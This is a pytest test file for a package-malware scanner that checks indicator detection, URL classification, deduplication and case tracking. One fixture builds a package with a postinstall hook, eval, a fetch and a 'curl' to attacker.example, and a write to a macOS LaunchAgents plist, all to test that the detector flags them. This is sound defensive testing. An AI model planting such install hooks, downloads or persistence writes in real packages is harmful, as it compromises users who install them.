from __future__ import annotations

import io
import json
import sqlite3
import tarfile
import zipfile

from secopsai.research_cases import add_evidence, add_subject, create_case, get_case, reclassify_ioc_candidates
from secopsai.research_intake import inspect_archive
from secopsai.research_artifacts import attach_to_case, import_artifact
from secopsai.research_signal_analysis import classify_path, classify_url, collect_observations, deduplicate_observations


def _tar(files: dict[str, str]) -> bytes:
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w:gz") as archive:
        for name, value in files.items():
            raw = value.encode()
            info = tarfile.TarInfo(name)
            info.size = len(raw)
            archive.addfile(info, io.BytesIO(raw))
    return output.getvalue()


def test_reference_like_strings_are_context_calibrated() -> None:
    result = inspect_archive(
        _tar(
            {
                "package/package.json": json.dumps({"name": "theme-manager", "version": "4.0.0", "scripts": {}}),
                "package/index.js": "function render(Acronym) { return 'TelescopePreviewSocket'; }",
                "package/README.md": "Install with npm install theme-manager. See https://registry.npmjs.org/theme-manager.",
            }
        ),
        "theme-manager.tgz",
    )
    rule_ids = {str(item.get("rule_id")) for item in result["indicators"]}
    assert "dynamic-eval" not in rule_ids
    assert "dynamic-function-constructor" not in rule_ids
    assert "persistence-target-write" not in rule_ids
    assert "outbound-network" not in rule_ids
    assert result["lifecycle_scripts"] == {}
    assert classify_path("package/README.md")["context_classification"] == "documentation"


def test_real_executable_equivalents_remain_visible() -> None:
    result = inspect_archive(
        _tar(
            {
                "package/package.json": json.dumps({"name": "bad", "scripts": {"postinstall": "node index.js"}}),
                "package/index.js": """
const { exec } = require('child_process');
eval('alert(1)');
new Function('return 1')();
fetch('https://attacker.example/payload');
require('fs').writeFileSync('/Users/me/Library/LaunchAgents/a.plist', 'x');
exec('curl https://attacker.example/payload');
""",
            }
        ),
        "bad.tgz",
    )
    rule_ids = {str(item.get("rule_id")) for item in result["indicators"]}
    assert "manifest-lifecycle-hook" in rule_ids
    assert "dynamic-eval" in rule_ids
    assert "dynamic-function-constructor" in rule_ids
    assert "outbound-network" in rule_ids
    assert "process-execution" in rule_ids
    assert "persistence-target-write" in rule_ids


def test_url_classification_separates_source_from_unknown_runtime() -> None:
    source = classify_url("https://registry.npmjs.org/theme-manager", path="package/README.md")
    documentation = classify_url("https://example.test/reference", path="package/README.md")
    unknown = classify_url("https://attacker.example/payload", path="package/index.js", network_call_evidence=True)
    assert source["classification"] == "source_reference"
    assert source["eligible_for_ioc_review"] is False
    assert documentation["classification"] == "documentation_url"
    assert documentation["eligible_for_ioc_review"] is False
    assert unknown["classification"] == "ioc_candidate"
    assert unknown["eligible_for_ioc_review"] is True


def test_duplicate_observations_are_counted_once() -> None:
    observations = [
        {"rule_id": "outbound-network", "path": "package/index.js", "analysis_method": "javascript_syntax", "matched_operation": "fetch"},
        {"rule_id": "outbound-network", "path": "package/index.js", "analysis_method": "javascript_syntax", "matched_operation": "fetch"},
    ]
    result = deduplicate_observations(observations, artifact_sha256="a" * 64)
    assert result["unique_observations"] == 1
    assert result["repeat_observations"] == 1
    assert result["observations"][0]["occurrence_count"] == 2


def test_legacy_fleet_findings_are_normalized_but_ioc_enrichment_is_not_scored() -> None:
    rows = collect_observations(
        {
            "findings": [{"rule_id": "OSS-DOWNLOAD-EXECUTE", "severity": "high", "confidence": "high", "file_path": "build.rs", "matched_indicator": "download then execute"}],
            "indicators": [{"type": "url", "value": "https://example.test/payload"}],
        }
    )
    assert len(rows) == 1
    assert rows[0]["analysis_method"] == "artifact_fleet_rule"
    assert rows[0]["confidence"] == 90
    assert rows[0]["path"] == "build.rs"


def test_collected_artifact_reconciles_subject_state(tmp_path) -> None:
    db = str(tmp_path / "soc.db")
    artifact_path = tmp_path / "artifact.nupkg"
    with zipfile.ZipFile(artifact_path, "w") as archive:
        archive.writestr("README.md", "safe fixture")
    case = create_case(title="State reconciliation", summary="fixture", case_type="malicious_package", db_path=db)
    case = add_subject(case["case_id"], subject_type="package", ecosystem="nuget", name="Demo", version="1.0", db_path=db)
    assert case["subjects"][0]["artifact_state"] == "missing"
    artifact = import_artifact(str(artifact_path), ecosystem="nuget", package_name="Demo", version="1.0", provenance={"source": "test-fixture"}, db_path=db)
    attach_to_case(case["case_id"], artifact["artifact_id"], db_path=db)
    reconciled = get_case(case["case_id"], db_path=db)
    assert reconciled["subjects"][0]["artifact_state"] == "collected"
    assert any(event["event_type"] == "subject_state_reconciled" for event in reconciled["timeline"])


def test_evidence_reobservation_preserves_one_record(tmp_path) -> None:
    db = str(tmp_path / "soc.db")
    case = create_case(title="Evidence dedupe", summary="fixture", case_type="malicious_package", db_path=db)
    metadata = {"analysis_tool": "fixture", "analysis_tool_version": "1", "observations": [{"rule_id": "rule-1", "path": "index.js", "matched_operation": "test"}]}
    add_evidence(case["case_id"], evidence_type="static_analysis", title="Fixture analysis", locator="fixture://analysis", provenance="fixture", metadata=metadata, db_path=db)
    repeated = add_evidence(case["case_id"], evidence_type="static_analysis", title="Fixture analysis", locator="fixture://analysis", provenance="fixture", metadata=metadata, db_path=db)
    assert len(repeated["evidence"]) == 1
    assert repeated["evidence"][0]["occurrence_count"] == 2
    assert any(event["event_type"] == "evidence_reobserved" for event in repeated["timeline"])


def test_legacy_source_url_candidates_are_reclassified_without_deletion(tmp_path) -> None:
    db = str(tmp_path / "soc.db")
    case = create_case(title="Legacy IOC repair", summary="fixture", case_type="malicious_package", db_path=db)
    with sqlite3.connect(db) as connection:
        connection.execute(
            """INSERT INTO research_ioc_candidates
               (candidate_id, case_id, ioc_type, value, confidence, reason, source_evidence_id, status, created_at)
               VALUES (?, ?, 'url', ?, 50, 'legacy extraction', NULL, 'pending', ?)""",
            ("IOC-C-LEGACY0001", case["case_id"], "https://thehackernews.com/article", "2026-08-28T00:00:00Z"),
        )
        connection.commit()
    repaired = get_case(case["case_id"], db_path=db)
    candidate = repaired["ioc_candidates"][0]
    assert candidate["status"] == "rejected"
    assert candidate["classification"] == "source_reference"
    assert any(event["event_type"] == "ioc_candidates_reclassified" for event in repaired["timeline"])
    # The explicit repair command is idempotent after the automatic read repair.
    assert reclassify_ioc_candidates(case["case_id"], db_path=db)["changed"] == []
